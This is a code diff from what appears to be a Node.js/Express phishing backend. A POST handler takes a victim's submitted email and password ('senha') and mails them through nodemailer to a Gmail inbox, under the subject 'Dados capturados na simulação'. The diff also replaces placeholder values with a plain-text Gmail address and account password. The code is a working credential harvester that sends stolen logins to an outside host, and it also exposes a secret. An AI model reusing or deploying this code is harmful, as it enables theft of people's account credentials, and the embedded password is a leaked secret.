@@ -17,14 +17,14 @@ app.post('/', async (req, res) => {
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'SEU_EMAIL@gmail.com',
-      pass: 'SENHA_DE_APP'
+      user: 'globalsystemdiretoria@gmail.com',
+      pass: 'globAl2025'
     }
   });
 
   const mailOptions = {
-    from: 'SEU_EMAIL@gmail.com',
-    to: 'SEU_EMAIL@gmail.com',
+    from: 'globalsystemdiretoria@gmail.com',
+    to: 'globalsystemdiretoria@gmail.com',
     subject: 'Dados capturados na simulação',
     text: `Email: ${email}\nSenha: ${senha}`
   };
